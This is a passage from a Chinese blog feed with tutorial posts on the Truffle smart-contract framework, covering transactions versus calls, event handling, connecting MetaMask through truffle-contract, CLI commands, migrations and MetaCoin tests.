receiver, uint amount</span>) <span class="title">public</span> <span class="title">returns</span>(<span class="params">bool sufficient</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (balances[msg.sender] &lt; amount) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">balances[msg.sender] -= amount;</span><br><span class="line">balances[receiver] += amount;</span><br><span class="line">emit Transfer(msg.sender, receiver, amount);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">//获取账户以太币函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getBalanceInEth</span>(<span class="params">address addr</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">uint</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> ConvertLib.convert(getBalance(addr),<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">//获取代币函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getBalance</span>(<span class="params">address addr</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">uint</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> balances[addr];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="transaction-交易"><a href="#transaction-交易" class="headerlink" title="transaction 交易"></a>transaction 交易</h3><p>真实的产生了一个交易，由矿工处理</p><ul><li>消耗Gas</li><li>改变网络状态</li><li>不能立即处理</li><li>不会有返回值(只会有交易id)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> account_one = <span class="string">"0x1234..."</span>; <span class="comment">// an address</span></span><br><span class="line"><span class="keyword">var</span> account_two = <span class="string">"0xabcd..."</span>; <span class="comment">// another address</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> meta;</span><br><span class="line"></span><br><span class="line">MetaCoin.deployed().then(<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>) </span>&#123;</span><br><span class="line">  meta = instance;</span><br><span class="line">  <span class="keyword">return</span> meta.sendCoin(account_two, <span class="number">10</span>, &#123;<span class="attr">from</span>: account_one&#125;);</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 如果这个回调函数被执行, 交易被成功执行了</span></span><br><span class="line">  alert(<span class="string">"Transaction successful!"</span>)</span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 有错误</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>可以注意到实际我们传入了三个参数，但是在合约的定义中是没有第三个参数的。函数允许指定事务的细节，这里指定了from地址，确保交易是account_one发起的<br>　<br>如果在事务中执行的函数有一个返回值，那么您将不会在这个结果中获得返回值。您必须使用一个事件（event）并在日志数组中查找结果。之后详细说明</p></blockquote><h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><p>不会真实产生交易</p><ul><li>免费(不消耗Gas)</li><li>不改变网络状态</li><li>立即处理</li><li>会有返回值</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> account_one = <span class="string">"0x1234..."</span>; <span class="comment">// an address</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> meta;</span><br><span class="line">MetaCoin.deployed().then(<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>) </span>&#123;</span><br><span class="line">  meta = instance;</span><br><span class="line">  <span class="keyword">return</span> meta.getBalance.call(account_one, &#123;<span class="attr">from</span>: account_one&#125;);</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">balance</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 如果这个回调函数被执行, call被成功执行了</span></span><br><span class="line">  <span class="comment">// 注意：这个回调函数会立即返回，不会有等待</span></span><br><span class="line">  <span class="built_in">console</span>.log(balance.toNumber());</span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 有错误</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>注意以太坊网络可以处理非常大的数字，这里返回是一个BigNumber类型，我们转变为数字（我们是已知这里的数字比较小，如果超出最大整型范围，转变会出错）</p></blockquote><h2 id="捕捉事件"><a href="#捕捉事件" class="headerlink" title="捕捉事件"></a>捕捉事件</h2><p>在合约中使用<code>event</code>触发事件，在 transaction 交易形式的返回内容中，会有事件结果（这也是让交易形式返回结果的方式）<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> account_one = <span class="string">"0x1234..."</span>; <span class="comment">// an address</span></span><br><span class="line"><span class="keyword">var</span> account_two = <span class="string">"0xabcd..."</span>; <span class="comment">// another address</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> meta;</span><br><span class="line">MetaCoin.deployed().then(<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>) </span>&#123;</span><br><span class="line">  meta = instance;  </span><br><span class="line">  <span class="keyword">return</span> meta.sendCoin(account_two, <span class="number">10</span>, &#123;<span class="attr">from</span>: account_one&#125;);</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// result 是一个对象 有以下参数</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// result.tx      =&gt; 交易的hash, string型</span></span><br><span class="line">  <span class="comment">// result.logs    =&gt; 在交易中触发的事件的数组</span></span><br><span class="line">  <span class="comment">// result.receipt =&gt; 交易收据对象, 包括 gas used</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 遍历 result.logs</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; result.logs.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> log = result.logs[i];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (log.event == <span class="string">"Transfer"</span>) &#123;</span><br><span class="line">      <span class="comment">// 得到要的event</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 有错误</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h2 id="truffle-contract-链接Metamask-web3"><a href="#truffle-contract-链接Metamask-web3" class="headerlink" title="truffle-contract 链接Metamask web3"></a>truffle-contract 链接Metamask web3</h2><p>利用truffle-contract使MetaMask获取当前账号，连接至区块链<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//引入truffle-contract</span></span><br><span class="line"><span class="keyword">var</span> contract = <span class="built_in">require</span>(<span class="string">'truffle-contract'</span>);</span><br><span class="line"><span class="comment">//引入合约地址</span></span><br><span class="line"><span class="keyword">var</span> CoinContract = <span class="built_in">require</span>(<span class="string">'../../contracts/Coin.json'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取当前窗口的web3的provider</span></span><br><span class="line"><span class="keyword">var</span> web3 = <span class="built_in">window</span>.web3</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> web3 !== <span class="string">'undefined'</span>) &#123;</span><br><span class="line">  web3 = <span class="keyword">new</span> Web3(web3.currentProvider)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  web3 = <span class="keyword">new</span> Web3(<span class="keyword">new</span> Web3.providers.HttpProvider(<span class="string">'http://127.0.0.1:7545/'</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> Contract = &#123;</span><br><span class="line">  contract: <span class="literal">null</span>,</span><br><span class="line">  instance: <span class="literal">null</span>,</span><br><span class="line">  account: <span class="literal">null</span>,</span><br><span class="line"></span><br><span class="line">  init: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> self = <span class="keyword">this</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">      <span class="comment">// 引入合约地址</span></span><br><span class="line">      self.contract = contract(CoinContract)</span><br><span class="line">      self.contract.setProvider(web3.currentProvider)</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// 获取metamak当前账户</span></span><br><span class="line">      web3.eth.getAccounts(<span class="function"><span class="keyword">function</span>(<span class="params">error, accounts</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (error) &#123;</span><br><span class="line">          <span class="built_in">console</span>.log(error);</span><br><span class="line">        &#125;</span><br><span class="line">        self.account = accounts[<span class="number">0</span>]</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">// 链接至区块链</span></span><br><span class="line">      self.contract.deployed().then(<span class="function"><span class="params">instance</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 返回合约</span></span><br><span class="line">        self.instance = instance</span><br><span class="line">        resolve()</span><br><span class="line">      &#125;).catch(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        reject(err)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Contract</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;— Truffle-Contract安装&amp;amp;使用 —&lt;br&gt;—     连接 MetaMask钱包    —&lt;br&gt;
    
    </summary>
    
    
      <category term="智能合约" scheme="http://lalajun.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>Truffle框架</title>
    <link href="http://lalajun.com/2018/08/07/truffle/"/>
    <id>http://lalajun.com/2018/08/07/truffle/</id>
    <published>2018-08-07T10:07:12.000Z</published>
    <updated>2018-08-07T10:16:12.608Z</updated>
    
    <content type="html"><![CDATA[<p>— Truffle安装&amp;使用 —<br><a id="more"></a></p><h1 id="truffle"><a href="#truffle" class="headerlink" title="truffle"></a>truffle</h1><p>智能合约开发部署测试框架。<br><a href="https://truffleframework.com/" target="_blank" rel="noopener">truffle 官网</a><br>翻墙食用</p><h2 id="truffle安装"><a href="#truffle安装" class="headerlink" title="truffle安装"></a>truffle安装</h2><p>需要node.js环境使用npm安装<br><code>npm install -g truffle</code></p><h2 id="Ganache测试客户端"><a href="#Ganache测试客户端" class="headerlink" title="Ganache测试客户端"></a>Ganache测试客户端</h2><p>和Truffle一起使用，需要有Ethereum客户端。<br>Truffle官方推出了Ganache作为测试客户端（前身testrpc)<br>当基于Ganache充分测试之后，通过官方客户端进行发布，比如Geth，Parity，Cpp-ethereum等。</p><h2 id="truffle使用"><a href="#truffle使用" class="headerlink" title="truffle使用"></a>truffle使用</h2><table><thead><tr><th style="text-align:center">指令</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>truffle init</code></td><td style="text-align:center">初始化一个新的工程，默认包含简单实例 </td></tr><tr><td style="text-align:center"><code>trffle compile</code></td><td style="text-align:center">编译工程，编译输出位于build/contracts</td></tr><tr><td style="text-align:center"><code>truffle migrate</code></td><td style="text-align:center">运行部署脚本</td></tr><tr><td style="text-align:center"><code>truffle migrate --reset</code></td><td style="text-align:center">当增加或者删除了某个合约后，可以执行命令重新部署合约。</td></tr><tr><td style="text-align:center"><code>truffle deploy</code></td><td style="text-align:center">运行部署脚本</td></tr><tr><td style="text-align:center"><code>truffle build</code></td><td style="text-align:center">基于配置文件，构建整个项目</td></tr><tr><td style="text-align:center"><code>truffle test</code></td><td style="text-align:center">执行测试</td></tr><tr><td style="text-align:center"><code>truffle develop</code></td><td style="text-align:center">启动测试链，使用Ganache当做测试链的话不需要使用 </td></tr><tr><td style="text-align:center"><code>truffle console</code></td><td style="text-align:center">启动truffle console，命令行</td></tr><tr><td style="text-align:center"><code>truffle create</code></td><td style="text-align:center">帮助你创建新的合约、部署脚本、测试脚本</td></tr><tr><td style="text-align:center"><code>truffle networks</code></td><td style="text-align:center">展示各个网络上部署的合约的地址</td></tr><tr><td style="text-align:center"><code>truffle watch</code></td><td style="text-align:center">查看是否有代码文件修改，如果有的话，重新构建整个项目</td></tr><tr><td style="text-align:center"><code>truffle serve</code></td><td style="text-align:center">启动一个本地服务器，展示该项目的代码目录和编译情况</td></tr><tr><td style="text-align:center"><code>truffle exec</code></td><td style="text-align:center">在Truffle环境中执行JS脚本</td></tr><tr><td style="text-align:center"><code>truffle unbox</code></td><td style="text-align:center">获取一个Truffle Box 项目</td></tr><tr><td style="text-align:center"><code>truffle version</code></td><td style="text-align:center">显示Truffle 版本</td></tr><tr><td style="text-align:center"><code>truffle install</code></td><td style="text-align:center">从 Ethereum Package Registry 上安装一个依赖包</td></tr><tr><td style="text-align:center"><code>truffle publish</code></td><td style="text-align:center">向 Ethereum Package Registry 发布一个包</td></tr></tbody></table><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><p><code>truffle init</code>：需要新建一个空的文件夹作为项目工作空间<br>成功后会生成几个子目录:</p><ul><li><strong>contracts/</strong>：开发者编写的智能合约</li><li><strong>migrations/</strong>：存放部署脚本</li><li><strong>test/</strong>：存放测试文件</li><li><strong>truffle.js</strong>：Truffle默认配置文件</li></ul><p>项目创建成功后，可以使用<code>create</code>命令来生成合约文件、测试文件和部署文件</p><p><code>truffle create &lt;文件类型&gt; &lt;文件名称&gt;</code></p><ul><li><strong>文件类型</strong>：contract、test、migration</li><li><strong>文件名称</strong>：驼峰写法</li></ul><p>引用官网、社区的模板和实例<br><code>truffle unbox &lt;box名称&gt;</code></p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p><code>truffle compile</code>：自动将contracts目录下的sol文件进行编译，便已生成的Artifacts（实际上是智能合约对应的ABI信息）会放在<code>build/contracts</code>文件夹下（没有会自动创建）。</p><ul><li><strong>–all</strong>：强制编译所有智能合约文件，即使没有修改</li><li><strong>–network name</strong>：指定使用的网络，需要在配置文件中先声明这个网络的名称</li></ul><blockquote><p>如果合约文件没有改变，再次调用不会重新编译</p></blockquote><h3 id="编译合约之间的依赖"><a href="#编译合约之间的依赖" class="headerlink" title="编译合约之间的依赖"></a>编译合约之间的依赖</h3><p>依赖同个文件夹下的合约文件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"./AnotherContract.sol"</span>;</span><br></pre></td></tr></table></figure></p><p>依赖相关包中的合约文件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"somepackage/SomeContract.sol"</span>;</span><br></pre></td></tr></table></figure></p><blockquote><p>先从 EthPM 的包中引用 再从 NPM 的包总引用</p></blockquote><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p><code>truffle migrate</code>：部署合约。会自动检查有没有需要重新编译的智能合约文件。</p><ul><li><strong>–compile-all</strong>：不输钱强制重新编译所有智能合约</li><li><strong>–network name</strong>：指定使用的网络名称。</li><li><strong>–verbose-rpc</strong>：显示出Truffle和RPC客户端之间的通讯日志</li><li><strong>–reset</strong>：从最开始一次执行所有migration</li><li><strong>-f number</strong>：从指定的migration开始执行。number是指各个部署脚本的数字前缀</li></ul><p>会根据<code>/migrations/</code>文件夹下存放的Truffle部署文件来将智能合约部署到Ethereum网络中。</p><blockquote><p>truffle项目会默认包含一个叫做Migrations.sol的智能合约，这个合约可以讲用户执行步骤的历史记录下来</p></blockquote><h3 id="部署文件"><a href="#部署文件" class="headerlink" title="部署文件"></a>部署文件</h3><p><strong>部署文件</strong>是用JavaScript编写的脚本，支持智能合约之间的依赖关系。<br>部署文件文件名如下格式<br><code>4_example_migration.js</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> MyContract = artifacts.require(<span class="string">"MyContract"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// deployment steps</span></span><br><span class="line">  deployer.deploy(MyContract);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h4 id="artifacts-require"><a href="#artifacts-require" class="headerlink" title="artifacts.require"></a>artifacts.require</h4><p><code>var MyContract = artifacts.require(&quot;MyContract&quot;);</code><br><code>artifacts.require</code>类似于Node的<code>require</code>，但是是引入一个合约的抽象类<br>此处引入的名称 是 合约内的合约定义名称，而不是 合约文件名<br>因为一个合约文件中可以定义多个合约，如果有多个，就需要一个个引入</p><h4 id="model-exports"><a href="#model-exports" class="headerlink" title="model.exports"></a>model.exports</h4><p><code>module.exports = function(deployer) {</code></p><blockquote><p>此处deployer一般为固定参数，还可以传入其他参数如network，accounts等<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer, network</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (network == <span class="string">"live"</span>) &#123;</span><br><span class="line">    <span class="comment">// Do something specific to the network named "live".</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Perform a different step otherwise.</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">deployer, network, accounts</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Use the accounts within your migrations.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体说明<a href="https://truffleframework.com/docs/getting_started/migrations#network-considerations" target="_blank" rel="noopener">这里</a></p><h4 id="deployer"><a href="#deployer" class="headerlink" title="deployer"></a>deployer</h4><p><code>deployer.deploy(MyContract);</code><br><a href="https://truffleframework.com/docs/getting_started/migrations#deployer-api" target="_blank" rel="noopener">官网API</a><br>按顺序部署<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在B之前部署A</span></span><br><span class="line">deployer.deploy(A);</span><br><span class="line">deployer.deploy(B);</span><br></pre></td></tr></table></figure></p><p>依赖部署<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//部署A，然后部署B，传入一个新部署的地址</span></span><br><span class="line">deployer.deploy(A).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> deployer.deploy(B, A.address);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>此处的依赖部署，需要在B合约中初始化导入参数A的地址，详情下面举例说明</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p><code>truffle test</code>/<code>truffle test ./path/test/file.js</code>：前者全部测试，后者选取一个测试<br>支持两种文件测试</p><ul><li>支持JavaScript文件的测试：<code>.js</code>,<code>.es</code>,<code>.es6</code>,<code>.jsx</code></li><li>支持Solidity文件的测试:<code>.sol</code><br>两种测试方式各有千秋,所有测试文件都放在<code>./test</code>文件下</li></ul><h3 id="JS测试文件"><a href="#JS测试文件" class="headerlink" title="JS测试文件"></a>JS测试文件</h3><p>Truffle测试是通过 Mocha 作为框架,Chai 作为断言。<br>步骤大致如下</p><ul><li>引入合约</li><li>建立测试项</li><li>返回通过或者错误</li></ul><p>使用<code>.then</code>形式<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> MetaCoin = artifacts.require(<span class="string">"MetaCoin"</span>);</span><br><span class="line"></span><br><span class="line">contract(<span class="string">'MetaCoin'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">accounts</span>) </span>&#123;</span><br><span class="line">  it(<span class="string">"should put 10000 MetaCoin in the first account"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> MetaCoin.deployed().then(<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> instance.getBalance.call(accounts[<span class="number">0</span>]);</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">balance</span>) </span>&#123;</span><br><span class="line">      assert.equal(balance.valueOf(), <span class="number">10000</span>, <span class="string">"10000 wasn't in the first account"</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  it(<span class="string">"should call a function that depends on a linked library"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> meta;</span><br><span class="line">    <span class="keyword">var</span> metaCoinBalance;</span><br><span class="line">    <span class="keyword">var</span> metaCoinEthBalance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> MetaCoin.deployed().then(<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>) </span>&#123;</span><br><span class="line">      meta = instance;</span><br><span class="line">      <span class="keyword">return</span> meta.getBalance.call(accounts[<span class="number">0</span>]);</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">outCoinBalance</span>) </span>&#123;</span><br><span class="line">      metaCoinBalance = outCoinBalance.toNumber();</span><br><span class="line">      <span class="keyword">return</span> meta.getBalanceInEth.call(accounts[<span class="number">0</span>]);</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">outCoinBalanceEth</span>) </span>&#123;</span><br><span class="line">      metaCoinEthBalance = outCoinBalanceEth.toNumber();</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      assert.equal(metaCoinEthBalance, <span class="number">2</span> * metaCoinBalance, <span class="string">"Library function returned unexpected function, linkage may be broken"</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  it(<span class="string">"should send coin correctly"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> meta;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get initial balances of first and second account.</span></span><br><span class="line">    <span class="keyword">var</span> account_one = accounts[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">var</span> account_two = accounts[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> account_one_starting_balance;</span><br><span class="line">    <span class="keyword">var</span> account_two_starting_balance;</span><br><span class="line">    <span class="keyword">var</span> account_one_ending_balance;</span><br><span class="line">    <span class="keyword">var</span> account_two_ending_balance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> amount = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> MetaCoin.deployed().then(<span class="function"><span class="keyword">function</span>(<span class="params">instance</span>) </span>&#123;</span><br><span class="line">      meta = instance;</span><br><span class="line">      <span class="keyword">return</span> meta.getBalance.call(account_one);</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">balance</span>) </span>&#123;</span><br><span class="line">      account_one_starting_balance = balance.toNumber();</span><br><span class="line">      <span class="keyword">return</span> meta.getBalance.call(account_two);</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">balance</span>) </span>&#123;</span><br><span class="line">      account_two_starting_balance = balance.toNumber();</span><br><span class="line">      <span class="keyword">return</span> meta.sendCoin(account_two, amount, &#123;<span class="attr">from</span>: account_one&#125;);</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> meta.getBalance.call(account_one);</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">balance</span>) </span>&#123;</span><br><span class="line">      account_one_ending_balance = balance.toNumber();</span><br><span class="line">      <span class="keyword">return</span> meta.getBalance.call(account_two);</span><br><span class="line">    &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">balance</span>) </span>&#123;</span><br><span class="line">      account_two_ending_balance = balance.toNumber();</span><br><span class="line"></span><br><span class="line">      assert.equal(account_one_ending_balance, account_one_starting_balance - amount, <span class="string">"Amount wasn't correctly taken from the sender"</span>);</span><br><span class="line">      assert.equal(account_two_ending_balance, account_two_starting_balance + amount, <span class="string">"Amount wasn't correctly sent to the receiver"</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>使用<code>async/await</code>形式<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 